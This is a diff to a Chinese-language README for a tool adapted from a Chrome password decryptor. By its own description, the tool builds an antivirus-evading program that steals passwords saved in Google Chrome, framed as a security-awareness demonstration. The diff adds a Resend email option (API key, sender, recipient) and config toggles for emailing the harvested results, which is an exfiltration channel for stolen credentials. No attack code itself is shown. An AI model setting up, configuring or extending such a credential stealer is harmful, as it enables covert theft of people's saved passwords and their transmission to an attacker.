@@ -6,6 +6,8 @@
 
 本仓库的源码是基于[ohyicong](https://github.com/ohyicong/decrypt-chrome-passwords)进行的修改，主要用于演示打包一个杀毒软件无法察觉的程序，窃取用户在google上保存的密码。提示大家对信息安全的注意，和用google浏览器保存密码非常不安全的认识。
 
+* 更新7/20 增加了resend邮件方式
+
 ## 2 使用
 
 ### 2.1 环境
@@ -38,14 +40,20 @@
             pass : '如果是163邮箱，则在网页版的设置中开启IMAP/SMTP服务后获得' 
             sender : '发送的邮箱'  
             receivers : '接收的邮箱（可以和发送邮箱相同）' 
+        resend:
+            key : 'resend.dev的key'
+            from: 'resend的from'
+            to: "注册resend的邮箱"
     ```    
+    这里增加了[resend](https://resend.com/overview)邮件方式方式，需要你先去注册个账号，然后生成key。注意的是默认情况下，它的from和to是固定的，注册后在示例那里能看到。如果key不填写，则不使用该方式发生邮件
 * 修改config文件，配置是否发送邮件，是否保存到本地的json文件
     ```yaml
         include : secret.yaml
 
         output:
-        json: 'ON'
-        email: 'ON'
+            json: 'ON'
+            email: 'ON'
+            sender_email : 'ON'
     ``
 
 ### 2.3 打包    
